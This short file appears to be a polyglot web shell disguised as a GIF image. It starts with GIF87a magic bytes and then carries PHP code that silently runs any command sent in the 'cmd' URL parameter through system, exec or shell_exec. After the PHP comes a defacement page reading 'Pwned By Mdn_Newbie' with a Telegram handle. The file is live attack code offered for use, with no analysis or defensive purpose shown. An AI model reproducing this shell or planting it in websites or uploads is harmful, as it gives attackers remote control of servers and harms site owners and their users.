GIF87a<?php
@error_reporting(0);
if(isset($_GET['cmd'])) {
    if(function_exists('system')) { @system($_GET['cmd']); }
    elseif(function_exists('exec')) { @exec($_GET['cmd'], $o); echo implode("
", $o); }
    elseif(function_exists('shell_exec')) { echo @shell_exec($_GET['cmd']); }
}
?><!DOCTYPE html>
<html>
<head>
<title>Pwned By Mdn_Newbie</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;}
h1{font-size:4em;text-shadow:0 0 20px #0f0;animation:glow 2s infinite;}
@keyframes glow{0%,100%{text-shadow:0 0 20px #0f0;}50%{text-shadow:0 0 40px #0ff;}}
</style>
</head>
<body>
<h1>Mdn_Newbie IS HERE</h1>
<p style="font-size:2em;color:#ffd700;">RCE + XSS Combined</p>
<p style="color:#f00;">t.me/marleyybob123</p>
<script>console.log('%cPolyShell RCE+XSS','color:#0f0;font-size:20px;');</script>
</body>
</html>